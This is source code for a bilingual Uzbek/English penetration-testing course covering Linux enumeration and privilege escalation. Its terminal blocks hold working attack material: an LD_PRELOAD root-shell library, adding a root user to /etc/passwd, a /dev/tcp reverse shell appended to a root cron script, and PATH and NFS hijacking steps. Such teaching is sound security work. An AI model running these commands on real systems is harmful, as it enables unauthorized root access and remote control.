...
function LessonL32(){
  ...
  return React.createElement("section",null,
    ...
    React.createElement(P,null,t(lang,"Ma'lumot yig'ish (enumeration) — tizimga kirish huquqini qo'lga kiritganingizdan so'ng bajariladigan birinchi qadam. CTF mashinalaridan farqli o'laroq, penetratsion test bir tizimga kirish bilan tugamaydi. Enumeratsiya buzib kirilgandan keyingi bosqichda ham, undan oldingi bosqichdek muhim: qanchalik ko'p bilsangiz, imtiyozlarni oshirish yo'lini shunchalik oson topasiz. Quyida qo'lda o'tkaziladigan asosiy tekshiruvlar keltirilgan.","Enumeration is the first step you take after gaining access to a system. Unlike CTF machines, a penetration test doesn't end when you get into one system. Enumeration is as important after the breach as before it: the more you know, the easier you find a privilege-escalation path. Below are the key manual checks.")),
    React.createElement(H2,{num:"§2"},t(lang,"Tizim ma'lumotlari","System information")),
    React.createElement(LayerStack,{layers:[
      {n:"hostname",name:t(lang,"Xost nomi","Host name"),color:"#4dabf7",desc:{uz:"Tizim roli haqida ipuchi berishi mumkin (masalan SQL-PROD-01).",en:"Can hint at the system's role (e.g. SQL-PROD-01)."}},
      {n:"uname -a",name:t(lang,"Yadro","Kernel"),color:"#ff3a5e",desc:{uz:"Yadro versiyasi — kernel exploit qidirishda kerak.",en:"Kernel version — needed to hunt kernel exploits."}},
      {n:"/proc/version",name:t(lang,"Yadro & GCC","Kernel & GCC"),color:"#a855f7",desc:{uz:"Yadro va kompilyator (GCC) haqida qo'shimcha ma'lumot.",en:"Extra info on kernel and compiler (GCC)."}},
      {n:"/etc/issue",name:t(lang,"OT versiyasi","OS version"),color:"#69db7c",desc:{uz:"Operatsion tizim haqida ma'lumot (o'zgartirilishi mumkin).",en:"OS info (can be edited)."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Jarayonlar (ps)","Processes (ps)")),
    React.createElement(P,null,t(lang,"ps buyrug'i ishlayotgan jarayonlarni ko'rsatadi. ps aux — barcha foydalanuvchilar jarayonlarini, ularni ishga tushirgan foydalanuvchi bilan birga ko'rsatadi; bu root sifatida ishlayotgan zaif xizmatlarni topishga yordam beradi. ps axjf esa jarayonlarni daraxt ko'rinishida beradi.","The ps command shows running processes. ps aux shows all users' processes together with the user that started them; this helps find vulnerable services running as root. ps axjf shows processes as a tree.")),
    React.createElement(SlideImg,{src:"privesc/lpe_s07.png",cap:"ps aux natijasi — har jarayon egasi (USER), PID va buyruq (COMMAND) bilan ko'rinadi.",capEn:"ps aux output — each process shown with its owner (USER), PID and command (COMMAND)."}),
    React.createElement(H2,{num:"§4"},t(lang,"Foydalanuvchilar va huquqlar","Users and privileges")),
    React.createElement(P,null,t(lang,"id joriy foydalanuvchining imtiyoz darajasi va guruh a'zoligini ko'rsatadi. sudo -l — eng muhim buyruqlardan biri: u siz sudo bilan (ba'zan parolsiz) ishga tushira oladigan buyruqlarni ro'yxatlaydi va ko'pincha root'ga to'g'ridan-to'g'ri yo'l ochadi. /etc/passwd faylini o'qish tizimdagi barcha foydalanuvchilarni topishning oson yo'li; history esa oldingi buyruqlarda qolgan parol yoki maslahatni ko'rsatishi mumkin.","id shows the current user's privilege level and group membership. sudo -l is one of the most important commands: it lists the commands you can run with sudo (sometimes without a password) and often opens a direct path to root. Reading /etc/passwd is an easy way to find all users on the system; history may reveal passwords or hints left in previous commands.")),
    React.createElement(SlideImg,{src:"privesc/lpe_s08.png",cap:"sudo -l — joriy foydalanuvchi sudo bilan ishga tushira oladigan buyruqlar ro'yxati.",capEn:"sudo -l — the list of commands the current user may run with sudo."}),
    React.createElement(H2,{num:"§5"},t(lang,"Tarmoq (netstat, ifconfig)","Network (netstat, ifconfig)")),
    React.createElement(P,null,t(lang,"ifconfig va ip route nishonning tarmoq interfeyslari va yo'nalishlarini ko'rsatadi — nishon boshqa tarmoqqa o'tish nuqtasi (pivot) bo'lishi mumkin. netstat mavjud ulanishlar va tinglash portlarini ochib beradi: netstat -a (barchasi), netstat -tp (xizmat nomi va PID bilan), netstat -ano (barcha rozetkalar, nomlarsiz, taymerlar bilan) eng ko'p ishlatiladi.","ifconfig and ip route show the target's network interfaces and routes — the target may be a pivot into another network. netstat reveals existing connections and listening ports: netstat -a (all), netstat -tp (with service name and PID), netstat -ano (all sockets, no name resolution, with timers) are the most used.")),
    React.createElement(SlideImg,{src:"privesc/lpe_s18.png",cap:"netstat -ano — barcha rozetkalar, nom aniqlanmasdan, taymerlar bilan ro'yxatlanadi.",capEn:"netstat -ano — lists all sockets, without name resolution, with timers."}),
    React.createElement(H2,{num:"§6"},t(lang,"find buyrug'i","The find command")),
    React.createElement(P,null,t(lang,"find — arsenaldagi eng kuchli enumeratsiya vositasi. U fayllarni nom, ruxsat, egasi yoki o'zgartirilgan vaqti bo'yicha qidiradi. Imtiyozlarni oshirish uchun eng muhimi — yozilishi mumkin papkalar va SUID bit o'rnatilgan fayllarni topish. find ko'p xatolik chiqargani uchun xatolarni /dev/null ga yo'naltirish (2>/dev/null) natijani toza qiladi.","find is the most powerful enumeration tool in the arsenal. It searches files by name, permission, owner or modification time. For privesc the most important uses are finding world-writable folders and files with the SUID bit set. Since find produces many errors, redirecting them to /dev/null (2>/dev/null) keeps the output clean.")),
    React.createElement(SlideImg,{src:"privesc/lpe_s22.png",cap:"find / -perm -u=s -type f 2>/dev/null — SUID bit o'rnatilgan fayllarni topadi (potentsial privesc vektori).",capEn:"find / -perm -u=s -type f 2>/dev/null — finds files with the SUID bit set (a potential privesc vector)."}),
    React.createElement(Terminal,null,"# Tizim ma'lumotlari\nhostname; uname -a; cat /proc/version; cat /etc/issue\n# Jarayonlar / foydalanuvchilar\nps aux; id; sudo -l; cat /etc/passwd; history\n# Tarmoq\nifconfig; ip route; netstat -ano\n# Muhim find misollari\nfind / -writable -type d 2>/dev/null        # yoziladigan papkalar\nfind / -perm -u=s -type f 2>/dev/null        # SUID fayllar\nfind / -name '*.conf' 2>/dev/null            # konfiguratsiya fayllari"),
    ...
    React.createElement(Quiz,{q:{uz:"Qaysi buyruq siz sudo bilan ishga tushira oladigan buyruqlarni ko'rsatadi?",en:"Which command shows the commands you can run with sudo?"},opts:[{uz:"uname -a",en:"uname -a"},{uz:"sudo -l",en:"sudo -l"},{uz:"hostname",en:"hostname"},{uz:"history",en:"history"}],correct:1,exp:{uz:"sudo -l joriy foydalanuvchiga berilgan sudo huquqlarini ro'yxatlaydi — bu ko'pincha root'ga tez yo'l.",en:"sudo -l lists the sudo rights granted to the current user — often a quick path to root."}}));
}
function LessonL33(){
  const lang=useLang();
  return React.createElement("section",null,
...
function LessonL35(){
  ...
  return React.createElement("section",null,
    ...
    React.createElement(SlideImg,{src:"privesc/auto_s05.png",cap:"sudo apache2 -f /etc/shadow — xato xabari orqali /etc/shadow ning birinchi qatori (root xeshi) oshkor bo'ladi.",capEn:"sudo apache2 -f /etc/shadow — the error message leaks the first line of /etc/shadow (the root hash)."}),
    React.createElement(H2,{num:"§3"},t(lang,"LD_PRELOAD","LD_PRELOAD")),
    React.createElement(P,null,t(lang,"LD_PRELOAD — bu har qanday dasturga umumiy kutubxonalarni (shared libraries) dastur ishga tushishidan OLDIN yuklashga imkon beruvchi muhit o'zgaruvchisi. Agar sudo konfiguratsiyasida \"env_keep\" opsiyasi LD_PRELOAD ni saqlasa, biz o'z zararli kutubxonamizni yaratib, uni sudo bilan ishga tushirilgan dastur yuklashiga majburlashimiz mumkin. Bu kutubxona ishga tushganda root shell ochadi.","LD_PRELOAD is an environment variable that lets any program load shared libraries BEFORE the program starts. If the sudo configuration keeps LD_PRELOAD via the \"env_keep\" option, we can create our own malicious library and force a sudo-run program to load it. When that library initializes, it opens a root shell.")),
    ...
    React.createElement(SlideImg,{src:"privesc/auto_s08.png",cap:"shell.c ni umumiy obyekt fayliga kompilyatsiya qilish: gcc -fPIC -shared -o shell.so shell.c -nostartfiles.",capEn:"Compiling shell.c into a shared object: gcc -fPIC -shared -o shell.so shell.c -nostartfiles."}),
    React.createElement(SlideImg,{src:"privesc/auto_s09.png",cap:"sudo LD_PRELOAD=/home/user/shell.so find — natijada root imtiyozli qobiq ochiladi.",capEn:"sudo LD_PRELOAD=/home/user/shell.so find — the result is a root-privileged shell."}),
    React.createElement(Terminal,null,"# 1) sudo huquqlarini ko'rish\nsudo -l\n\n# 2) shell.c — root qobig'ini ochadi\ncat > shell.c << 'EOF'\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init(){\n  unsetenv(\"LD_PRELOAD\");\n  setgid(0); setuid(0);\n  system(\"/bin/bash\");\n}\nEOF\n\n# 3) umumiy obyektga kompilyatsiya\ngcc -fPIC -shared -o shell.so shell.c -nostartfiles\n\n# 4) sudo bilan ishlatiladigan istalgan dastur orqali ishga tushirish\nsudo LD_PRELOAD=/home/user/shell.so find\n# id → uid=0(root)"),
...
function LessonL36(){
  ...
  return React.createElement("section",null,
    ...
    React.createElement(P,null,t(lang,"SUID va SGID (Set Group ID) fayllar ruxsatlarida maxsus \"s\" bitini ko'rsatadi (masalan -rwsr-xr-x). find buyrug'i ularni topadi. Topilgan har bir bajariladigan faylni GTFOBins bilan solishtiring — u SUID o'rnatilganda ekspluatatsiya qilinishi mumkin bo'lgan dasturlarni ro'yxatlaydi. Ammo GTFOBins har doim oson g'alaba bermaydi; ko'pincha oraliq qadamlar kerak.","SUID and SGID (Set Group ID) files show a special \"s\" bit in their permissions (e.g. -rwsr-xr-x). The find command locates them. Compare each executable you find against GTFOBins — it lists programs that can be exploited when SUID is set. But GTFOBins doesn't always give an easy win; often intermediate steps are needed.")),
    React.createElement(SlideImg,{src:"privesc/suid_s04.png",cap:"find / -type f -perm -04000 -ls 2>/dev/null — SUID biti o'rnatilgan fayllar ro'yxati (masalan nano, passwd).",capEn:"find / -type f -perm -04000 -ls 2>/dev/null — the list of files with the SUID bit set (e.g. nano, passwd)."}),
    React.createElement(H2,{num:"§3"},t(lang,"Ekspluatatsiya 1: /etc/shadow o'qish","Exploitation 1: reading /etc/shadow")),
    React.createElement(P,null,t(lang,"Aytaylik, nano matn muharririda SUID biti o'rnatilgan va u root'ga tegishli. Bu nano orqali root huquqi bilan fayllarni o'qish va tahrirlash mumkinligini anglatadi. Biz nano /etc/shadow bilan parol xeshlarini o'qiymiz, so'ng unshadow vositasi bilan /etc/passwd va /etc/shadow ni birlashtirib, John the Ripper buzadigan fayl yaratamiz.","Suppose nano has the SUID bit set and is owned by root. This means we can read and edit files with root privileges through nano. We read the password hashes with nano /etc/shadow, then combine /etc/passwd and /etc/shadow with the unshadow tool to create a file John the Ripper can crack.")),
    React.createElement(SlideImg,{src:"privesc/suid_s07.png",cap:"SUID nano orqali /etc/shadow tarkibini o'qish — parol xeshlari ko'rinadi.",capEn:"Reading the contents of /etc/shadow via SUID nano — the password hashes are revealed."}),
    React.createElement(H2,{num:"§4"},t(lang,"Ekspluatatsiya 2: /etc/passwd ga foydalanuvchi qo'shish","Exploitation 2: adding a user to /etc/passwd")),
    React.createElement(P,null,t(lang,"Parolni buzishning zerikarli jarayonini chetlab o'tishning boshqa yo'li — /etc/passwd ga root imtiyozli yangi foydalanuvchi qo'shish. Avval openssl passwd bilan parol xeshini yaratamiz, so'ng uni foydalanuvchi nomi va 0:0 (root UID/GID) bilan /etc/passwd ga (SUID nano orqali) yozamiz. Keyin o'sha foydalanuvchiga o'tsak, root qobig'iga ega bo'lamiz.","Another way to skip the tedious password-cracking process is to add a new root-privileged user to /etc/passwd. First we make a password hash with openssl passwd, then write it (via SUID nano) into /etc/passwd with a username and 0:0 (root UID/GID). Switching to that user gives us a root shell.")),
    React.createElement(SlideImg,{src:"privesc/suid_s09_b.png",cap:"openssl passwd bilan xesh yaratib, uni root (0:0) foydalanuvchisi sifatida /etc/passwd ga qo'shish.",capEn:"Creating a hash with openssl passwd and adding it to /etc/passwd as a root (0:0) user."}),
    React.createElement(Terminal,null,"# SUID fayllarni topish\nfind / -type f -perm -04000 -ls 2>/dev/null\n\n# Variant 1: shadow o'qib, John bilan buzish\nunshadow passwd.txt shadow.txt > passwords.txt\njohn passwords.txt\n\n# Variant 2: /etc/passwd ga root foydalanuvchi qo'shish\nopenssl passwd -1 -salt hacker Password123      # xesh yaratadi\n# hacker:$1$...:0:0:root:/root:/bin/bash  qatorini /etc/passwd ga yozamiz\nsu hacker      # → root qobig'i"),
...
function LessonL37(){
  ...
  return React.createElement("section",null,
    ...
    React.createElement(P,null,t(lang,"Capabilities — administratorlar jarayon yoki bajariladigan faylga imtiyozlarni batafsilroq darajada berish uchun ishlatadigan mexanizm. Masalan, agar SOC analitigiga soket ulanishlarini ochadigan vosita kerak bo'lsa, lekin unga to'liq root berish istalmasa, administrator faqat o'sha faylga tegishli imkoniyatni beradi. Natijada fayl to'liq root bo'lmasdan o'z vazifasini bajaradi. Ammo noto'g'ri berilgan capability privesc vektoriga aylanishi mumkin.","Capabilities are a mechanism admins use to grant privileges to a process or executable at a finer level. For example, if a SOC analyst needs a tool that opens socket connections but shouldn't get full root, the admin grants only the relevant capability to that file. The file then does its job without being full root. But a misassigned capability can become a privesc vector.")),
    React.createElement(P,null,t(lang,"getcap vositasi yoqilgan imkoniyatlarni ro'yxatlaydi. Imtiyozsiz foydalanuvchi sifatida getcap -r / juda ko'p xatolik chiqaradi, shuning uchun xatolarni /dev/null ga yo'naltiring. Topilgan imkoniyatni GTFOBins bilan solishtiring — masalan cap_setuid o'rnatilgan dastur ko'pincha to'g'ridan-to'g'ri root shell'ga aylantiriladi.","The getcap tool lists enabled capabilities. As an unprivileged user getcap -r / produces many errors, so redirect them to /dev/null. Compare a found capability against GTFOBins — for example a program with cap_setuid can often be turned straight into a root shell.")),
    ...
    React.createElement(P,null,t(lang,"Cron ishlari skript yoki dasturlarni ma'lum vaqtlarda avtomatik ishga tushirish uchun ishlatiladi. Odatiy holda ular joriy foydalanuvchining emas, EGASINING imtiyozlari bilan ishlaydi. G'oya oddiy: agar root imtiyozi bilan ishlaydigan cron vazifasi bo'lsa va biz u ishga tushiradigan skriptni o'zgartira olsak, bizning kodimiz ham root bilan ishlaydi. Tizim bo'ylab cron ishlari /etc/crontab faylida saqlanadi va uni har qanday foydalanuvchi o'qiy oladi.","Cron jobs run scripts or programs automatically at set times. By default they run with the OWNER's privileges, not the current user's. The idea is simple: if a cron job runs as root and we can modify the script it launches, our code also runs as root. System-wide cron jobs are stored in /etc/crontab, which any user can read.")),
    React.createElement(SlideImg,{src:"privesc/suid_s18.png",cap:"Root'ga tegishli cron skripti (backup.sh) reverse shell qo'shish uchun tahrirlanadi — ishga tushganda root qobig'i ochiladi.",capEn:"A root-owned cron script (backup.sh) edited to add a reverse shell — when it runs, a root shell opens."}),
    React.createElement(H2,{num:"§3"},t(lang,"Cron ekspluatatsiyasi va PATH","Cron exploitation and PATH")),
    React.createElement(P,null,t(lang,"Agar root ishga tushiradigan skriptga yozish huquqingiz bo'lsa, uni reverse shell chaqiradigan qilib o'zgartirasiz va hujum mashinangizda tinglovchi (nc -lvnp) ochasiz. Yana bir keng tarqalgan xato — o'chirilgan skriptning cron yozuvi qolib ketishi: agar skriptning to'liq yo'li ko'rsatilmagan bo'lsa, cron /etc/crontab dagi PATH bo'yicha qidiradi, va biz o'sha nom bilan o'z skriptimizni yozib qo'yishimiz mumkin. Real pentestda tizimni buzmaslik uchun reverse shell'ni afzal ko'ring.","If you have write access to a script that root runs, you modify it to call a reverse shell and open a listener (nc -lvnp) on your attack box. Another common mistake is a leftover cron entry for a deleted script: if the script's full path isn't specified, cron searches along the PATH in /etc/crontab, and we can drop our own script with that name. In a real pentest prefer a reverse shell so you don't break the system.")),
    React.createElement(Terminal,null,"# Cron ishlarini ko'rish\ncat /etc/crontab\n\n# Yoziladigan root skriptiga reverse shell qo'shish\necho 'bash -i >& /dev/tcp/<HUJUM-IP>/4444 0>&1' >> backup.sh\n\n# Hujum mashinasida tinglovchi\nnc -lvnp 4444\n\n# Capability tekshiruvi\ngetcap -r / 2>/dev/null"),
...
function LessonL38(){
  ...
  return React.createElement("section",null,
    ...
    React.createElement(P,null,t(lang,"PATH — operatsion tizimga bajariladigan fayllarni qayerdan qidirishni aytadigan muhit o'zgaruvchisi. To'liq yo'l bilan yozilmagan har qanday buyruq uchun Linux PATH ostidagi papkalarni navbatma-navbat qidiradi. Masalan, siz shunchaki \"ls\" desangiz, tizim PATH dagi /usr/bin, /bin va hokazolarda ls faylini qidiradi. Bu qidiruv tartibi privesc vektorini yaratishi mumkin.","PATH is an environment variable that tells the OS where to look for executables. For any command not written as a full path, Linux searches the folders under PATH in order. For example, if you just type \"ls\", the system looks for the ls file in /usr/bin, /bin and so on from PATH. This search order can create a privesc vector.")),
    React.createElement(SlideImg,{src:"privesc/path_s02.png",cap:"echo $PATH — tizim bajariladigan fayllarni qidiradigan papkalar ro'yxati.",capEn:"echo $PATH — the list of folders the system searches for executables."}),
    ...
    React.createElement(SlideImg,{src:"privesc/path_s08_b.png",cap:"export PATH=/tmp:$PATH so'ng /bin/bash ni /tmp/thm sifatida nusxalash — SUID skript uni root bilan ishga tushiradi.",capEn:"export PATH=/tmp:$PATH then copying /bin/bash as /tmp/thm — the SUID script runs it as root."}),
    React.createElement(H2,{num:"§3"},t(lang,"NFS va no_root_squash","NFS and no_root_squash")),
    React.createElement(P,null,t(lang,"Imtiyozlarni oshirish faqat ichki vektorlar bilan cheklanmaydi. NFS (Network File Share) konfiguratsiyasi /etc/exports faylida saqlanadi va odatda o'qilishi mumkin. Muhim element — no_root_squash opsiyasi. Odatda NFS masofaviy root'ni past imtiyozli nfsnobody ga o'zgartiradi; lekin no_root_squash yoqilgan yoziladigan ulashmada biz SUID bit o'rnatilgan bajariladigan faylni yaratib, uni nishonda root bilan ishga tushirishimiz mumkin.","Privilege escalation isn't limited to internal vectors. NFS (Network File Share) configuration is stored in /etc/exports and is usually readable. The key element is the no_root_squash option. Normally NFS maps a remote root to the low-privilege nfsnobody; but on a writable share with no_root_squash enabled, we can create an executable with the SUID bit and run it as root on the target.")),
    React.createElement(SlideImg,{src:"privesc/path_s10.png",cap:"/etc/exports faylida no_root_squash opsiyasi — masofaviy root o'z huquqini saqlaydi (privesc vektori).",capEn:"The no_root_squash option in /etc/exports — a remote root keeps its rights (a privesc vector)."}),
    React.createElement(Terminal,null,"# ── PATH hijacking ──\necho $PATH\nfind / -writable 2>/dev/null | grep -v proc | sort -u\nexport PATH=/tmp:$PATH\ncp /bin/bash /tmp/thm && chmod +x /tmp/thm\n./zaif_suid_dastur      # 'thm' ni qidiradi → bizning bash root bilan ishlaydi\n\n# ── NFS no_root_squash ──\nshowmount -e <NISHON-IP>          # ulashmalarni ko'rish\nmount -o rw <NISHON-IP>:/share /mnt/nfs\n# /mnt/nfs da SUID bajariladigan fayl yaratamiz (nfs.c → /bin/bash)"),
